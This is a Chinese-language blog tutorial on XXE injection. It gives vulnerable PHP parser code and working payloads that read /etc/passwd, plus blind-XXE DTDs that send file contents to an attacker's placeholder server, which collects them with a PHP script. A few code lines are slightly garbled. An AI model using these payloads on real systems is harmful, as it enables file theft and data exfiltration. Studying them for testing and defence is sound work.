@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="#前言​    XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.​    在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe知识总结">
+<meta property="og:url" content="https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Quincy&#39;s blog">
+<meta property="og:description" content="#前言​    XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.​    在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/31/9xmZj0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/31/9xmnBT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/31/9xmQN4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/31/9xmuHU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/31/9xmmuV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/31/9xmMEF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/31/9xm3C9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/31/9xml4J.png">
+<meta property="article:published_time" content="2018-04-10T09:28:50.000Z">
+<meta property="article:modified_time" content="2020-03-17T03:15:54.752Z">
+<meta property="article:author" content="Quincy">
+<meta property="article:tag" content="xxe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/03/31/9xmZj0.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>xxe知识总结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/04/10/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&text=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&is_video=false&description=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xxe知识总结&body=Check out this article: https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&name=xxe知识总结&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">#前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">#漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML解析器"><span class="toc-number">3.</span> <span class="toc-text">#XML解析器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#可显XXE"><span class="toc-number">4.</span> <span class="toc-text">#可显XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Blind-XXE"><span class="toc-number">5.</span> <span class="toc-text">#Blind XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE危害"><span class="toc-number">6.</span> <span class="toc-text">#XXE危害</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        xxe知识总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Quincy's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-04-10T09:28:50.000Z" itemprop="datePublished">2018-04-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Web/">Web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/xxe/" rel="tag">xxe</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h4 id="前言"><a href="#前言" class="headerlink" title="#前言"></a>#前言</h4><p>​    XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.<br>​    在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="#漏洞利用"></a>#漏洞利用</h4><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<h4 id="XML解析器"><a href="#XML解析器" class="headerlink" title="#XML解析器"></a>#XML解析器</h4><ul>
+<li><p>PHP</p>
+<p>PHP对于XML的处理方式有两种：<code>XML Expat Parser</code>  <code>SimpleXML</code></p>
+<p>XML Expat Parser, 使用Expat XML解析器，默认情况下不会解析外部实体。</p>
+<p>SimpleXML҆MDocument默认情况下会解析外部实体，从而造成安全威胁。</p>
+</li>
+<li><p>Java</p>
+<p>Java解析XML的常用第三方库，如果不禁用DTD，Entity，则都有可能会导致XXE漏洞</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.stream.XMLStreamReader; </span><br><span class="line">javax.xml.parsers.DocumentBuilderFactory; </span><br><span class="line">org.dom4j.io.SAXReader; </span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory; </span><br><span class="line">javax.xml.parsers.SAXParser; </span><br><span class="line">javax.xml.parsers.DocumentBuilder; </span><br><span class="line">org.jdom.input.SAXBuilder; </span><br><span class="line">org.dom4j.DocumentHelper; </span><br><span class="line">org.jdom.output.XMLOutputter;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在利用过程中，各语言对于外部实体引用所允许的协议如下图：</p>
+<p><img src="https://s1.ax1x.com/2018/03/31/9xmZj0.png" alt=""></p>
+<p>​</p>
+</li>
+</ul>
+<h4 id="可显XXE"><a href="#可显XXE" class="headerlink" title="#可显XXE"></a>#可显XXE</h4><p>可显XXE，即会显示XML结果</p>
+<p>测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php </span><br><span class="line">libxml_disable_entity_loader(falsefalse); </span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>); </span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument(); </span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="comment">#LIBXML_NOENT: 将XML中的实体引用替换成对应的值</span></span><br><span class="line"><span class="comment">#LIBXML_DTDLOAD: 加载DOCTYPE中的DTD文件</span></span><br><span class="line">$creds = simplexml_import_dom($dom); </span><br><span class="line">$user = $creds-&gt;user; </span><br><span class="line">$pass = $creds-&gt;pass; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have logged in as user $user"</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>正常情况下我们应该发送以下信息：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到回显如下：</p>
+<p><img src="https://s1.ax1x.com/2018/03/31/9xmnBT.png" alt=""></p>
+<p>更改一下payload就可以进行文件读取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">&lt;!ELEMENT user ANY &gt;</span><br><span class="line">&lt;!ELEMENT pass ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt; </span><br><span class="line">&lt;creds&gt; </span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt; </span><br><span class="line">    &lt;pass&gt;test&lt;&#x2F;pass&gt; </span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2018/03/31/9xmQN4.png" alt=""></p>
+<p><em>注</em>：构造XML时 ，最好按照语法和语义约束去构造，并且最大可能的与原xml数据符合，以免解析失败。</p>
+<p><strong>读取存在特殊字符的文件</strong></p>
+<p>当我们读取的文件内容中包含有特殊字符 <code>&lt; &amp;</code>等时，会导致解析错误，读取失败。</p>
+<p>这时候我们需要借助<code>php://filter</code>中的<code>base64</code>过滤器进行编码，其编码的结果为全字符，不会影响XML的解析。</p>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">&lt;!ELEMENT user ANY &gt;</span><br><span class="line">&lt;!ELEMENT pass ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt; &lt;creds&gt; </span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt; </span><br><span class="line">&lt;pass&gt;test&lt;&#x2F;pass&gt; </span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s1.ax1x.com/2018/03/31/9xmuHU.png" alt=""></p>
+<p>读取源码后，将其进行base64解码即可。</p>
+<h4 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="#Blind XXE"></a>#Blind XXE</h4><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p>
+<ul>
+<li><p>参数实体</p>
+<p>参数实体可以引用其他的参数实体，但是参数实体只能在DTD中声明、使用。</p>
+<p>语法格式如下：</p>
+<p><code>&lt;!ENTITY % entity_name &quot;value&quot;&gt;</code></p>
+</li>
+</ul>
+<p>测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = $_GET[<span class="string">'xml'</span>];</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>测试方法一：</strong></p>
+<p>vps上的DTD文件如下：</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39; standalone&#x3D;&#39;no&#39;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;key.dtd&quot;&gt; </span><br><span class="line">%remote; </span><br><span class="line">%int; </span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2018/03/31/9xmmuV.png" alt=""></p>
+<p>这是我我们打开vps的日志文件可以看到base64编码后的文件：</p>
+<p><img src="https://s1.ax1x.com/2018/03/31/9xmMEF.png" alt=""></p>
+<ul>
+<li><p><strong>测试方法二：</strong></p>
+<p>为了方便我们将payload改成这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39; standalone&#x3D;&#39;no&#39;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;key.dtd&quot;&gt; </span><br><span class="line">%remote; </span><br><span class="line">%int;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>vps上的DTD文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​</p>
+<p><strong>读取限制</strong></p>
+<p>当我们用该方法取读取大文件时会发现报错：</p>
+<p><code>Detecated an entity reference loop in http……</code></p>
+<p>原来libxml解析器默认限制外部实体长度为2k，没法突破，只能寻找一下压缩数据方面的。<a href="http://php.net/manual/zh/filters.compression.php" target="_blank" rel="noopener">php过滤器</a>中提供了一个<code>zlib.deflate</code>压缩数据。</p>
+<p>因此我们只要将DTD文件修改成这样：    </p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    之后再进行解压缩：</p>
+<p><code>php://filter/read=convert.base64-decode/zlib.inflate/resource=file.txt</code></p>
+<p><em>注</em> ：file.txt为你得到的压缩后的文件编码</p>
+<ul>
+<li><p>测试方法三：</p>
+<p>在主机上放一个get.php用于接受文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'01.txt'</span>, $_GET[<span class="string">'xxe'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>DTD文件修改如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;get.php?xxe&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​</p>
+</li>
+</ul>
+<p><img src="https://s1.ax1x.com/2018/03/31/9xm3C9.png" alt=""></p>
+<p>我们打开<code>01.txt</code>就能看到编码后的文件了</p>
+<p><img src="https://s1.ax1x.com/2018/03/31/9xml4J.png" alt=""></p>
+<h4 id="XXE危害"><a href="#XXE危害" class="headerlink" title="#XXE危害"></a>#XXE危害</h4><ul>
+<li>读取任意文件</li>
+<li>执行系统命令</li>
+<li>探查内网端口</li>
+<li>攻击内网网址</li>
+<li>DOS拒绝服务攻击</li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">#前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">#漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML解析器"><span class="toc-number">3.</span> <span class="toc-text">#XML解析器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#可显XXE"><span class="toc-number">4.</span> <span class="toc-text">#可显XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Blind-XXE"><span class="toc-number">5.</span> <span class="toc-text">#Blind XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE危害"><span class="toc-number">6.</span> <span class="toc-text">#XXE危害</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&text=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&is_video=false&description=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xxe知识总结&body=Check out this article: https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&title=xxe知识总结" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.quincy.codes/2018/04/10/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/&name=xxe知识总结&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Quincy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
